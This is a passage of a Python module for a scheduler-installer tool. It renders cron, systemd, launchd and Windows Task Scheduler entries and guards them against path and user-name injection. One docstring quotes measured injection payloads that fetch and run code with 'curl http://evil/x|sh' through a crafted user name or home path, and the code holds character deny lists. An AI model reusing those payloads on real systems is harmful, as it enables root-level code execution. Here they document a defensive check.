"""The host clock: the OS scheduler that wakes ``awrise run-due``.

awrise is deliberately NOT a daemon. The operating system already owns a
scheduler that survives a reboot, a logout and a crashed Python, so the brick's
job is to register one entry in it, prove the entry is really there, and keep an
honest record of what it was told to do.

Five adapters, one shape each::

    awrise install --cron           one marked crontab line
    awrise install --systemd-user   ~/.config/systemd/user/awrise.{service,timer}
    awrise install --systemd-system /etc/systemd/system/awrise.{service,timer}
    awrise install --launchd        ~/Library/LaunchAgents/com.aitherium.awrise.plist
    awrise install --schtasks       run-due.cmd + run-hidden.vbs + two triggers

Every adapter supports ``--print`` (render to stdout, touch nothing) and
``--dry-run`` (name every file and command, run none of them), and every real
install READS THE ENTRY BACK from the scheduler before it prints success. A
create that reports success and registers nothing is the failure this module
exists to make impossible.

The rendering half is pure: ``render(kind, ctx)`` maps a context to artifact
text and nothing else, so the golden-file tests compare bytes on every OS.

Windows, specifically
---------------------
A scheduled task whose trigger is an interactive logon and whose program is
console-subsystem (``cmd.exe``, a ``.cmd``, ``python.exe``) makes Task Scheduler
allocate a REAL console on the desktop, and that console takes focus -- it eats
keystrokes for as long as the payload runs. The fix is to launch through
``wscript.exe`` (GUI-subsystem, allocates no console) running a tiny VBScript
shim that starts the payload at window style 0 and WAITS, so the exit code still
propagates. ``Settings/Hidden`` in the task XML does not do this; it only hides
the task from the Task Scheduler list.

Two more Windows facts are wired in below because each one silently breaks a
task that otherwise looks correct:

* ``schtasks`` caps the ``/tr`` value at 261 characters and fails the whole
  create when it is exceeded, and routing through the shim roughly doubles the
  length (two quoted paths instead of one). The cap is asserted before the
  create, and a home that busts it falls back to a short bin directory.
* a per-minute trigger under an interactive token does not fire before anybody
  logs on, so a second entry with an at-startup trigger is registered for the
  same payload.
* ``&``, ``%`` and ``^`` in the home path each kill the payload with no console
  to complain to -- cmd.exe ends the command at ``&`` even inside quotes,
  expands ``%...%`` before it looks at the quoting, and eats ``^`` as its
  escape character. The render refuses such a path rather than installing a
  task that reports success and never runs.
* the exit-code line writes its redirection FIRST, because a digit immediately
  left of ``>>`` is read as a file handle: the natural
  ``echo ... exit=%ERRORLEVEL%>>"log"`` logs ``exit=`` with the number gone,
  and for exit 0 and 2 sends the whole line to a console nobody has.

The payload ``.cmd`` ends in ``exit /b 0`` on purpose: a failing JOB is not a
failing TASK. The wake ledger carries the verdict (and ``install --check``
reads it); the task's last result stays green so a host-wide scheduled-task
audit does not turn red the first time a job exits non-zero.

What it refuses to touch
------------------------
Every adapter registers under a FIXED name, and the commands that do it
(``/create /f``, ``/delete /f``, ``crontab -``, a unit file at a shared path)
overwrite or delete without asking. So nothing is written or removed until it
is shown to be ours: a task is ours when its action launches the payload this
module renders, a file is ours when it carries the generated marker, and a
crontab line is ours when it ends in the marker comment. ``crontab -l`` failing
is treated as UNJUDGED and stops the write, never as an empty crontab -- that
reading is how a rewrite deletes every entry somebody else has, silently and
with rc 0.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import subprocess
import sys
import xml.sax.saxutils
from dataclasses import dataclass, field
from datetime import timedelta
from pathlib import Path
from typing import Dict, List, Optional, Sequence, Tuple

from . import clock, ledger, lock, store

#: What the adapters register. Kept short: it lands inside the ``/tr`` budget.
TASK_NAME = "awrise"
BOOT_TASK_NAME = "awrise-boot"
LAUNCHD_LABEL = "com.aitherium.awrise"
CRON_MARKER = "# awrise"
RECORD_NAME = "hostclock.json"
LOG_NAME = "run-due.log"

#: ``schtasks`` rejects a longer ``/tr``. Measured, not documented.
TR_MAX = 261

#: ``install --check`` wants a tick inside this many install intervals.
TICK_GRACE_FACTOR = 3

#: A tick stamped further ahead than this is not a measurement of freshness, it
#: is a clock that moved: an NTP step, a host whose time was set backwards, a
#: peer writing into the same ledger from another timezone. Judged as a NO,
#: never as "the clock is running".
TICK_FUTURE_TOLERANCE_S = 5.0

#: Every artifact this module writes carries this literal, and nothing else on
#: a host has a reason to. It is how an install knows the file under its name
#: is one of ours BEFORE it overwrites it, and how a removal knows not to
#: delete somebody else's.
GENERATED_MARKER = "awrise-generated"

#: Characters cmd.exe mangles inside a payload path, measured on Windows 11:
#: ``&`` ends the command even inside quotes, ``%`` is expanded before the
#: quoting is looked at, and ``^`` is eaten as the escape character -- the path
#: silently loses it. The rest cannot occur in a Windows path at all. A home
#: holding one of these cannot be driven through the .cmd + shim chain, and
#: what it produces is a task that reports success and never runs, so the
#: render refuses rather than installing that.
CMD_HOSTILE = '&%^<>|"'

#: Characters a POSIX SHELL reads as syntax inside the cron line. The crontab
#: form is ``*/1 * * * * AWRISE_HOME="<home>" <argv> >>"<log>" 2>&1 # awrise``,
#: run by ``/bin/sh -c``: a ``"`` closes the assignment and everything after it
#: is a command cron runs every minute as the owner. ``$`` and ``` ` ``` are
#: substitutions INSIDE the quotes, and ``%`` is cron's own: unescaped it ends
#: the command and the rest becomes the job's stdin. A lone ``\`` is NOT in the
#: set: inside double quotes sh treats it literally except before one of the
#: characters already refused, and putting it in would refuse every Windows
#: path to a render this module is allowed to PRINT on Windows.
CRON_HOSTILE = '"$`%'

#: Every render embeds these strings in a LINE-ORIENTED file (a crontab line, a
#: systemd unit, an XML plist). A newline or carriage return in one of them is
#: not a broken path, it is a second directive -- ``User=bob\nExecStartPre=...``
#: inside the ``[Service]`` section of a unit ``--systemd-system`` installs into
#: /etc/systemd/system. Every control character is refused, not just those two:
#: none can occur in a real path, and NUL truncates the file for some readers.
_CONTROL = frozenset(chr(code) for code in range(0x20)) | {chr(0x7F)}

#: What a user name may be. ``ctx.user`` is ``$USER``/``$USERNAME``/``$LOGNAME``
#: -- the environment, never validated -- and it is written straight into
#: ``User=`` in a root-owned unit. POSIX user names are this, plus a trailing
#: ``$`` for a machine account; a domain form (``DOMAIN\user``) is allowed
#: because a joined host really has one, and ``\`` cannot start a directive.
USER_RE = re.compile(r"[A-Za-z0-9._][A-Za-z0-9._@\\-]*\$?")

KINDS = ("cron", "systemd-user", "systemd-system", "launchd", "schtasks")

#: The invoker a HOST CLOCK stamps on the pass it starts: every adapter above
#: launches ``run-due --invoker <kind>``, so a tick row carrying one of these
#: was started by a scheduler, and one carrying ``manual`` or ``selftest`` was
#: started by a person or a test.
#:
#: Freshness is judged on these rows ONLY. Measured 2026-09-18 on this host: the
#: ledger's single day file had been written entirely by hand-run passes, no
#: scheduled task existed at all, and the unfiltered reading made every surface
#: say "something else is ticking it" about a clock that had never once fired.
#: A hand-run pass proves awrise works; it is not evidence that anything wakes it.
#:
#: ``systemd`` is in the set and is NOT a kind: both systemd adapters render one
#: ``awrise.service``, and its ExecStart stamps ``--invoker systemd``
#: (``_render_systemd``). Measured 2026-09-19, before this line: a synthetic
#: healthy systemd host -- timer enabled, payloads present, ticks 1/5/10 minutes
#: old stamped exactly as the rendered unit stamps them -- was judged
#: "registered and not running" by ``install --check`` and by ``doctor``. The
#: set is derived from what the ADAPTERS WRITE, and
#: ``test_hostclock_invoker.py`` asserts that for every kind, so a new adapter
#: cannot repeat it.
SCHEDULED_INVOKERS = frozenset(KINDS) | {"systemd"}

#: Which artifact of each kind is written to disk by us (the rest is the
#: scheduler's own database, which we only ever read back).
_PAYLOAD_ARTIFACTS = {
    "cron": (),
    "systemd-user": ("awrise.service", "awrise.timer"),
    "systemd-system": ("awrise.service", "awrise.timer"),
    "launchd": (LAUNCHD_LABEL + ".plist",),
    "schtasks": ("run-due.cmd", "run-hidden.vbs"),
}


class HostClockError(Exception):
    """Cannot do the thing. ``code`` is the process exit code: 1 = a measured
    NO, 2 = could not judge (wrong OS, scheduler absent, unreadable)."""

    def __init__(self, message: str, code: int = 2) -> None:
        super().__init__(message)
        self.code = code


@dataclass(frozen=True)
class Context:
    """Everything a render needs, as plain strings.

    Strings, not ``Path``: a ``Path`` renders with the flavour of the OS that
    built it, and these templates are compared byte-for-byte by tests that run
    on every OS.
    """

    python: str
    home: str
    bin_dir: str
    log_path: str
    every_s: int
    user: str = "awrise"
    version: str = "0.0.0"
    sep: str = "/"

    @property
    def minutes(self) -> int:
        return max(1, int(round(self.every_s / 60.0)))


@dataclass
class Entry:
    """What an install (or a plan) actually is."""

    kind: str
    installed: bool
    lines: List[str] = field(default_factory=list)
    artifacts: Dict[str, str] = field(default_factory=dict)
    commands: List[List[str]] = field(default_factory=list)
    readback: str = ""
    record: Optional[dict] = None


@dataclass
class Definition:
    """What the scheduler says about our entry, right now."""

    present: bool
    enabled: bool
    detail: str


def version() -> str:
    from . import __version__

    return __version__


# --------------------------------------------------------------- the context


def _join(parts: Sequence[str], sep: str) -> str:
    return sep.join(parts)


def context(
    kind: str, base: Optional[Path] = None, every_s: int = 60, python: Optional[str] = None
) -> Context:
    """The live context for *kind* on this host."""
    if kind not in KINDS:
        raise HostClockError(f"unknown host clock {kind!r}; known: {', '.join(KINDS)}", 2)
    home_path = base if base is not None else store.home()
    sep = "\\" if kind == "schtasks" else "/"
    home = str(home_path)
    bin_dir = _join([home, "bin"], sep)
    if kind == "schtasks":
        bin_dir = _short_enough_bin_dir(home, sep)
    return Context(
        python=python or sys.executable or "python",
        home=home,
        bin_dir=bin_dir,
        log_path=_join([home, "logs", LOG_NAME], sep),
        every_s=int(every_s),
        user=_current_user(),
        version=version(),
        sep=sep,
    )


def _current_user() -> str:
    for key in ("USER", "USERNAME", "LOGNAME"):
        value = os.environ.get(key)
        if value:
            return value
    return "awrise"


def _short_enough_bin_dir(home: str, sep: str) -> str:
    """The bin directory whose payload paths still fit the ``/tr`` budget.

    A deep profile directory pushes the shim form over the cap, and the create
    then fails whole -- so the fallback is a short per-user directory rather
    than an install that reports success and registered nothing.
    """
    first = _join([home, "bin"], sep)
    if len(_tr_value(first, sep)) <= TR_MAX:
        return first
    local = os.environ.get("LOCALAPPDATA")
    if local:
        fallback = _join([local, "awrise", "bin"], sep)
        if len(_tr_value(fallback, sep)) <= TR_MAX:
            return fallback
    return first


def _tr_value(bin_dir: str, sep: str) -> str:
    shim = _join([bin_dir, "run-hidden.vbs"], sep)
    payload = _join([bin_dir, "run-due.cmd"], sep)
    return f'wscript.exe //B //Nologo "{shim}" "{payload}"'


# ------------------------------------------------------------------- renders


def cron_schedule(every_s: int) -> str:
    """A crontab schedule field for an interval.

    Cron's granularity is one minute, and a step that does not divide its field
    restarts at the top of the hour (``*/7`` fires at :00 and then 7 minutes
    later, so the last gap of the hour is short). That is the scheduler's
    behaviour, not an approximation this module hides: ``install --check``
    judges by measured ticks, never by the interval it asked for.
    """
    minutes = max(1, int(round(every_s / 60.0)))
    if minutes < 60:
        return f"*/{minutes} * * * *"
    hours = minutes // 60
    if hours < 24:
        return f"0 */{hours} * * *"
    return "0 0 * * *"


def effective_every_s(kind: str, every_s: int) -> int:
    """The interval the SCHEDULER will really use for this request.

    Every adapter here has a floor or a grid: cron's field is whole minutes and
    collapses to hourly and then to daily, and the task scheduler counts whole
    minutes too. Asking for 10s therefore gets a wake a minute -- a perfectly
    good clock, which judging against the 10s that was ASKED for would call
    dead forever. The install record keeps this number and ``install --check``
    measures against it.
    """
    every_s = max(1, int(every_s))
    if kind == "schtasks":
        return max(1, int(round(every_s / 60.0))) * 60
    if kind == "cron":
        # Deliberately the same branches as cron_schedule, and a test asserts
        # the two agree: a number that drifted from the schedule it describes
        # would be worse than no number at all.
        minutes = max(1, int(round(every_s / 60.0)))
        if minutes < 60:
            return minutes * 60
        hours = minutes // 60
        return hours * 3600 if hours < 24 else 86400
    # systemd (OnUnitActiveSec) and launchd (StartInterval) are both seconds.
    return every_s


def tick_age_phrase(age: Optional[float]) -> str:
    """How old the last tick is, in words that stay true when it is negative."""
    if age is None:
        return "never"
    if age < -TICK_FUTURE_TOLERANCE_S:
        return (
            f"stamped {int(-age)}s in the FUTURE -- the host clock moved "
            f"backwards, so nothing can be judged from it"
        )
    return f"{int(max(0.0, age))}s ago"


def _run_due_argv(ctx: Context, invoker: str) -> List[str]:
    return [ctx.python, "-m", "awrise", "run-due", "--quiet", "--invoker", invoker]


def _render_cron(ctx: Context) -> Dict[str, str]:
    command = " ".join(_run_due_argv(ctx, "cron"))
    line = (
        f'{cron_schedule(ctx.every_s)} AWRISE_HOME="{ctx.home}" {command} '
        f'>>"{ctx.log_path}" 2>&1 {CRON_MARKER}'
    )
    return {"crontab-line": line + "\n"}


def _render_systemd(ctx: Context, system: bool) -> Dict[str, str]:
    exec_start = " ".join(_run_due_argv(ctx, "systemd"))
    service = [
        "[Unit]",
        f"# {GENERATED_MARKER} {ctx.version} - rewritten by `awrise install`; do not edit.",
        "Description=awrise - one run-due pass",
        "",
        "[Service]",
        "Type=oneshot",
        f"Environment=AWRISE_HOME={ctx.home}",
        f"ExecStart={exec_start}",
    ]
    if system:
        # A system unit has no user by default; the store is owner-only, so the
        # unit must name the owner or every wake writes as root into a home it
        # then refuses to read. Anchored on ExecStart rather than an index: a
        # line added above it would otherwise move User= into another section.
        service.insert(service.index(f"ExecStart={exec_start}"), f"User={ctx.user}")
    # No [Install] section on purpose: the TIMER is what gets enabled, and a
    # oneshot service that is also wanted by a target runs once at boot on its
    # own -- an extra wake nobody asked for, on the one pass most likely to
    # collide with the boot trigger.
    service.append("")
    timer = [
        "[Unit]",
        f"# {GENERATED_MARKER} {ctx.version} - rewritten by `awrise install`; do not edit.",
        f"Description=awrise clock - wake run-due every {ctx.every_s}s",
        "",
        "[Timer]",
        "OnBootSec=90",
        f"OnUnitActiveSec={ctx.every_s}",
        "AccuracySec=10",
        # Deliberate, and not copied from the watchdog unit this shape came
        # from: a laptop that was asleep across a window should catch up once
        # on resume rather than pretend the window never existed.
        "Persistent=true",
        "Unit=awrise.service",
        "",
        "[Install]",
        "WantedBy=timers.target",
        "",
    ]
    return {"awrise.service": "\n".join(service), "awrise.timer": "\n".join(timer)}


def _render_launchd(ctx: Context) -> Dict[str, str]:
    # Every interpolated value is XML-escaped, because a plist is a DOCUMENT
    # and these are paths: a legitimate '&' in a home produced a plist launchctl
    # rejects as malformed, and '</string></dict><key>x</key><string>' produced
    # injected keys. `refuse_injection` has already removed what escaping cannot
    # fix (control characters, which XML 1.0 cannot carry at all).
    esc = xml.sax.saxutils.escape
    args = "".join(f"    <string>{esc(part)}</string>\n" for part in _run_due_argv(ctx, "launchd"))
    home, log_path = esc(ctx.home), esc(ctx.log_path)
    plist = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
        '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
        '<plist version="1.0">\n'
        f"<!-- {GENERATED_MARKER} {ctx.version} - rewritten by `awrise install`; "
        f"do not edit. -->\n"
        "<dict>\n"
        "  <key>Label</key>\n"
        f"  <string>{LAUNCHD_LABEL}</string>\n"
        "  <key>ProgramArguments</key>\n"
        "  <array>\n"
        f"{args}"
        "  </array>\n"
        "  <key>EnvironmentVariables</key>\n"
        "  <dict>\n"
        "    <key>AWRISE_HOME</key>\n"
        f"    <string>{home}</string>\n"
        "  </dict>\n"
        "  <key>StartInterval</key>\n"
        f"  <integer>{ctx.every_s}</integer>\n"
        "  <key>RunAtLoad</key>\n"
        "  <true/>\n"
        "  <key>StandardOutPath</key>\n"
        f"  <string>{log_path}</string>\n"
        "  <key>StandardErrorPath</key>\n"
        f"  <string>{log_path}</string>\n"
        "</dict>\n"
        "</plist>\n"
    )
    return {LAUNCHD_LABEL + ".plist": plist}


def refuse_hostile_cmd_paths(ctx: Context) -> None:
    """Refuse a path the batch payload cannot carry intact.

    Measured, because every one of these fails SILENTLY under the shim: the
    console the payload would have complained to does not exist, the task
    reports whatever the mangled line returned, and ``install --check`` sees a
    clock that is registered and never ticks -- indistinguishable from one that
    simply stopped. Refusing at render time is the only honest answer, and it
    names the character so the fix (move the home, or set LOCALAPPDATA) is
    obvious.
    """
    for label, value in (
        ("AWRISE_HOME", ctx.home),
        ("the payload directory", ctx.bin_dir),
        ("the log path", ctx.log_path),
        ("the interpreter path", ctx.python),
    ):
        bad = sorted({ch for ch in value if ch in CMD_HOSTILE})
        if bad:
            raise HostClockError(
                f"{label} contains {' '.join(repr(ch) for ch in bad)}, which cmd.exe "
                f"does not carry through a batch payload: the wake would die before "
                f"awrise runs, with no console and no ledger row to say so. Put "
                f"AWRISE_HOME on a path without {' '.join(repr(ch) for ch in bad)}. "
                f"({label} is {value!r})",
                2,
            )


def _render_schtasks(ctx: Context) -> Dict[str, str]:
    refuse_hostile_cmd_paths(ctx)
    logs_dir = _join([ctx.home, "logs"], ctx.sep)
    run = " ".join(f'"{part}"' if " " in part else part for part in _run_due_argv(ctx, "schtasks"))
    cmd_lines = [
        "@echo off",
        f"REM awrise-generated {ctx.version} - written by `awrise install --schtasks`.",
        "REM Do not edit: the next install rewrites it from the wheel.",
        "setlocal",
        f'set "AWRISE_HOME={ctx.home}"',
        f'if not exist "{logs_dir}" mkdir "{logs_dir}"',
        f'{run} >>"{ctx.log_path}" 2>&1',
        "REM The redirection comes FIRST on purpose. cmd.exe reads a digit",
        "REM immediately left of `>>` as a FILE HANDLE, so the natural form",
        'REM `echo ... exit=%ERRORLEVEL%>>"log"` logs `exit=` with the code',
        "REM swallowed -- and for codes 0 and 2 redirects the line to stdin or",
        "REM stderr, where the hidden shim loses it entirely. This line is the",
        "REM only host-side evidence left when the ledger is the thing that",
        "REM failed, so it is written where a handle cannot be read out of it.",
        f'>>"{ctx.log_path}" echo %DATE% %TIME% awrise run-due exit=%ERRORLEVEL%',
        "REM A failing JOB is not a failing TASK: the wake ledger carries the",
        "REM verdict and `awrise install --check` reads it, so this wrapper",
        "REM always reports success and the task's last result stays green.",
        "exit /b 0",
    ]
    # Explicit CRLF, written as bytes later: a payload with bare LF endings is
    # read by cmd.exe as one mangled line and the task does nothing at all.
    cmd_text = "\r\n".join(cmd_lines) + "\r\n"
    vbs_lines = [
        "' Launch a console payload with no visible window.",
        f"' awrise-generated {ctx.version} - rewritten on every install; do not edit.",
        "' wscript.exe is GUI-subsystem, so Task Scheduler allocates NO console for",
        "' it; WScript.Shell.Run(cmd, 0, True) starts the payload hidden and WAITS,",
        "' so the payload's exit code still reaches the scheduler.",
        'Set sh = CreateObject("WScript.Shell")',
        'args = ""',
        "For i = 0 To WScript.Arguments.Count - 1",
        '  args = args & """" & WScript.Arguments(i) & """ "',
        "Next",
        "WScript.Quit sh.Run(args, 0, True)",
    ]
    vbs_text = "\r\n".join(vbs_lines) + "\r\n"
    commands = schtasks_commands(ctx)
    # The rendered form names the scheduler by its bare name so the text is the
    # same on every host; what we actually RUN carries its absolute path,
    # because a bare name resolves through PATH and a task creator is not a
    # thing to resolve loosely.
    rendered = (
        "\n".join(" ".join([os.path.basename(argv[0])] + list(argv[1:])) for argv in commands)
        + "\n"
    )
    return {"run-due.cmd": cmd_text, "run-hidden.vbs": vbs_text, "schtasks-create.txt": rendered}


def schtasks_payload_paths(ctx: Context) -> Tuple[str, str]:
    """(shim path, payload path) for the schtasks adapter."""
    return (
        _join([ctx.bin_dir, "run-hidden.vbs"], ctx.sep),
        _join([ctx.bin_dir, "run-due.cmd"], ctx.sep),
    )


def schtasks_tr(ctx: Context) -> str:
    """The ``/tr`` value, asserted against the cap before anything is created."""
    shim, payload = schtasks_payload_paths(ctx)
    value = f'wscript.exe //B //Nologo "{shim}" "{payload}"'
    if len(value) > TR_MAX:
        raise HostClockError(
            f"the launch command would be {len(value)} characters, over the {TR_MAX} "
            f"the scheduler accepts, and the create would be rejected whole. Put "
            f"AWRISE_HOME on a shorter path, or set LOCALAPPDATA.",
            2,
        )
    return value


def schtasks_commands(ctx: Context) -> List[List[str]]:
    """The two ``schtasks /create`` calls: the interval trigger, then at-startup.

    Two entries rather than two triggers because the command-line front end
    registers exactly one trigger per create. The second exists because an
    interval trigger under an interactive token does not fire before anybody
    has logged on, and a host that reboots unattended would simply never run.

    Neither create uses an interactive logon trigger, and the launch command is
    the ``wscript`` shim either way -- so a task from this function can never
    put a console on somebody's desktop, which is the property the source-level
    scan for task-creating code is looking for.
    """
    tr = schtasks_tr(ctx)
    exe = _schtasks_exe()
    return [
        [
            exe,
            "/create",
            "/f",
            "/tn",
            TASK_NAME,
            "/sc",
            "minute",
            "/mo",
            str(ctx.minutes),
            "/rl",
            "limited",
            "/tr",
            tr,
        ],
        [
            exe,
            "/create",
            "/f",
            "/tn",
            BOOT_TASK_NAME,
            "/sc",
            "onstart",
            "/rl",
            "limited",
            "/tr",
            tr,
        ],
    ]


def quote_argv(argv: Sequence[str]) -> str:
    """One command line a human can PASTE, from an argv we would have run.

    ``" ".join(argv)`` is not that command. The ``/tr`` value is a single
    argument holding spaces and its own quotes, so the joined form reaches
    schtasks as five arguments and is rejected -- i.e. the "run this yourself"
    line handed to an operator when a create is refused was, verbatim, a
    command that cannot work. Tokens with whitespace are quoted and inner
    quotes escaped the way the C runtime schtasks parses its argv expects.
    """
    parts: List[str] = []
    for token in argv:
        if token and not any(ch in token for ch in ' \t"'):
            parts.append(token)
            continue
        parts.append('"' + token.replace('"', '\\"') + '"')
    return " ".join(parts)


def _task_name_of(argv: Sequence[str]) -> str:
    """The ``/tn`` value of a schtasks command line, or ""."""
    for index, token in enumerate(argv):
        if token.lower() == "/tn" and index + 1 < len(argv):
            return argv[index + 1]
    return ""


def boot_entry_command(ctx: Context) -> List[str]:
    """The argv that registers the at-startup entry, or []."""
    for argv in schtasks_commands(ctx):
        if _task_name_of(argv) == BOOT_TASK_NAME:
            return list(argv)
    return []


def boot_entry_gap_line(ctx: Context, detail: str) -> str:
    """What to say when the at-startup entry could not be registered.

    Measured 2026-09-18 on this host: ``/sc minute`` registers for an ordinary
    user and ``/sc onstart`` answers ``ERROR: Access is denied.`` -- a boot
    trigger needs elevation. Failing the whole install on that left this box
    with NO clock at all for want of the second entry, which is the strictly
    worse outcome: the interval entry is the one that ticks while somebody is
    logged on. So the gap is named, with the one command that closes it, and
    the clock still gets installed.
    """
    argv = boot_entry_command(ctx)
    return (
        f"NOTICE: the at-startup entry {BOOT_TASK_NAME} was refused ({detail or 'no detail'}). "
        f"The interval entry is registered, so the clock ticks while somebody is logged on; "
        f"what is missing is the wake after an UNATTENDED reboot. A boot trigger needs "
        f"elevation -- run this from an elevated shell to close it:\n"
        f"  {quote_argv(argv) if argv else '(no at-startup command for this kind)'}"
    )


#: What `schtasks /create` leaves behind that stops a clock dead, measured on
#: the task it registered here 2026-09-18: ``DisallowStartIfOnBatteries`` and
#: ``StopIfGoingOnBatteries`` are both TRUE by default and there is no CLI flag
#: for either, so on any laptop running on battery the task is Ready, Enabled,
#: on schedule -- and never starts. ``MultipleInstances`` is restated because a
#: settings set replaces the lot, and IgnoreNew is the property that makes an
#: overlapping wake REFUSED rather than queued.
_BATTERY_PS = (
    "$s = New-ScheduledTaskSettingsSet -MultipleInstances IgnoreNew "
    "-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries; "
    "Set-ScheduledTask -TaskName '{name}' -Settings $s | Out-Null"
)


def battery_settings_command(name: str = TASK_NAME) -> List[str]:
    """The command that clears the battery defaults off a registered task."""
    return [
        "powershell",
        "-NoProfile",
        "-NonInteractive",
        "-Command",
        _BATTERY_PS.format(name=name),
    ]


def _apply_battery_settings(name: str, notes: Optional[List[str]]) -> None:
    """Best effort, and LOUD when it does not take.

    Nothing here can fail the install: the task is registered and will tick on
    mains power either way. What must not happen is the silence -- a laptop
    whose clock never fires, with every surface saying Ready.
    """
    argv = battery_settings_command(name)
    try:
        done = _run(argv)
        failed = done.returncode != 0
        detail = (done.stderr or done.stdout).strip()
    except (OSError, subprocess.SubprocessError) as exc:
        failed, detail = True, str(exc)
    if failed and notes is not None:
        notes.append(
            f"NOTICE: {name} still carries schtasks' battery defaults "
            f"(DisallowStartIfOnBatteries / StopIfGoingOnBatteries), so on battery "
            f"power it will not start and nothing will say so ({detail or 'no detail'}). "
            f"Fix:\n  {quote_argv(argv)}"
        )


def boot_entry_notes(kind: str, ctx: Context) -> List[str]:
    """Lines about the at-startup entry: present, missing, or unjudgeable."""
    if kind != "schtasks":
        return []
    try:
        xml = _schtasks_definition_xml(BOOT_TASK_NAME)
    except OSError as exc:
        return [f"boot entry: UNJUDGED -- the scheduler could not be asked ({exc})"]
    if xml is not None:
        return [f"boot entry: {BOOT_TASK_NAME} registered (wakes run-due after a reboot)"]
    return [boot_entry_gap_line(ctx, "not registered")]


def _schtasks_exe() -> str:
    root = os.environ.get("SystemRoot") or os.environ.get("windir") or "C:\\Windows"
    candidate = os.path.join(root, "System32", "schtasks.exe")
    return candidate if os.path.exists(candidate) else "schtasks.exe"


def refuse_injection(kind: str, ctx: Context) -> None:
    """Refuse a context that would write something other than what it says.

    Every render below interpolates ``ctx`` into a file another program PARSES
    -- a crontab line a shell runs, a unit systemd reads as directives, an XML
    plist launchd loads. None of those values is validated anywhere upstream:
    ``ctx.home`` is ``$AWRISE_HOME`` and ``ctx.user`` is
    ``$USER``/``$USERNAME``/``$LOGNAME``. Measured 2026-09-19, by render:

    * ``user="bob\\nExecStartPre=/bin/sh -c 'curl http://evil/x|sh'"`` emitted
      that line inside ``[Service]`` -- an injected directive in a unit
      ``--systemd-system`` installs at /etc/systemd/system, i.e. as root;
    * ``home='/tmp/h";curl http://evil/x|sh;#'`` emitted
      ``AWRISE_HOME="/tmp/h";curl http://evil/x|sh;#" ...`` -- arbitrary shell
      run by cron every minute;
    * a home holding ``</string></dict><key>x</key><string>&`` went into the
      plist verbatim, producing injected plist keys.

    Only the schtasks adapter had a guard at all (``refuse_hostile_cmd_paths``).
    This is the one for the other four, and it runs for schtasks too, because a
    newline is no better inside a ``.cmd``. Refusing is the honest answer rather
    than escaping: these values name a path this brick is about to schedule, and
    a path nobody can type is a mistake, not a preference.
    """
    fields = (
        ("AWRISE_HOME", ctx.home),
        ("the payload directory", ctx.bin_dir),
        ("the log path", ctx.log_path),
        ("the interpreter path", ctx.python),
        ("the user name", ctx.user),
    )
    for label, value in fields:
        bad = sorted({ch for ch in str(value) if ch in _CONTROL})
        if bad:
            raise HostClockError(
                f"{label} contains {' '.join(repr(ch) for ch in bad)}. Every artifact "
                f"awrise writes is read line by line by another program, so a control "
                f"character there is not a path -- it is a second directive in a file "
                f"the scheduler obeys. Refusing to render {kind}. ({label} is {value!r})",
                2,
            )
    if kind in ("systemd-system", "systemd-user") and not USER_RE.fullmatch(str(ctx.user)):
        raise HostClockError(
            f"the user name {ctx.user!r} is not a user name, and it is written into "
            f"`User=` in a unit file. Set USER (or LOGNAME) to the account the wake "
            f"should run as. Refusing to render {kind}.",
            2,
        )
    if kind == "cron":
        for label, value in fields[:-1]:
            bad = sorted({ch for ch in str(value) if ch in CRON_HOSTILE})
            if bad:
                raise HostClockError(
                    f"{label} contains {' '.join(repr(ch) for ch in bad)}, which the "
                    f"shell (or cron itself, for '%') reads as syntax inside the "
                    f"crontab line -- the line would run something other than awrise, "
                    f"every minute, as you. Put AWRISE_HOME on a path without them. "
                    f"({label} is {value!r})",
                    2,
                )


def render(kind: str, ctx: Context) -> Dict[str, str]:
    """Artifact name -> exact text. Pure: no environment, no clock, no disk."""
    if kind not in KINDS:
        raise HostClockError(f"unknown host clock {kind!r}; known: {', '.join(KINDS)}", 2)
    refuse_injection(kind, ctx)
    if kind == "cron":
        return _render_cron(ctx)
    if kind == "systemd-user":
        return _render_systemd(ctx, system=False)
    if kind == "systemd-system":
        return _render_systemd(ctx, system=True)
    if kind == "launchd":
        return _render_launchd(ctx)
    if kind == "schtasks":
        return _render_schtasks(ctx)
    raise HostClockError(f"unknown host clock {kind!r}; known: {', '.join(KINDS)}", 2)


def digest(artifacts: Dict[str, str]) -> Dict[str, str]:
    """sha256 per artifact, so a record can say WHICH bytes it installed."""
    return {
        name: hashlib.sha256(text.encode("utf-8")).hexdigest()
        for name, text in sorted(artifacts.items())
    }


# ------------------------------------------------------------- where it lands


def artifact_targets(kind: str, ctx: Context) -> Dict[str, str]:
    """Artifact name -> absolute path we write it to (payload files only)."""
    names = _PAYLOAD_ARTIFACTS[kind]
    if kind in ("systemd-user", "systemd-system"):
        directory = (
            os.path.expanduser("~/.config/systemd/user")
            if kind == "systemd-user"
            else "/etc/systemd/system"
        )
        return {name: os.path.join(directory, name) for name in names}
    if kind == "launchd":
        directory = os.path.expanduser("~/Library/LaunchAgents")
        return {name: os.path.join(directory, name) for name in names}
    if kind == "schtasks":
        return {name: _join([ctx.bin_dir, name], ctx.sep) for name in names}
    return {}


def _newline_for(kind: str) -> str:
    # The schtasks payload carries its own CRLF endings inside the text, so it
    # is written with newline translation OFF; everything else is LF.
    return "" if kind == "schtasks" else "\n"


def refuse_foreign_file(path: Path) -> None:
    """Refuse to overwrite a file at one of our paths that we did not write.

    The unit and plist paths are FIXED names in shared directories, so "write
    the artifact" is a write over whatever is already there. Every artifact
    this module renders carries the generated marker, so a file without one is,
    by construction, somebody else's.
    """
    try:
        existing = path.read_text(encoding="utf-8", errors="replace")
    except FileNotFoundError:
        return
    except OSError as exc:
        raise HostClockError(
            f"{path} exists and cannot be read, so it cannot be shown to "
            f"be one of ours; refusing to overwrite it ({exc})",
            2,
        ) from exc
    if GENERATED_MARKER not in existing:
        raise HostClockError(
            f"{path} exists and carries no {GENERATED_MARKER} marker: "
            f"this awrise did not write it. Refusing to overwrite a file "
            f"somebody else owns -- move it aside first.",
            1,
        )


def _write_payloads(kind: str, ctx: Context, artifacts: Dict[str, str]) -> List[str]:
    written = []
    for name, target in artifact_targets(kind, ctx).items():
        path = Path(target)
        refuse_foreign_file(path)
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "w", encoding="utf-8", newline=_newline_for(kind)) as handle:
            handle.write(artifacts[name])
        written.append(str(path))
    return written


def payloads_present(kind: str, ctx: Context) -> List[str]:
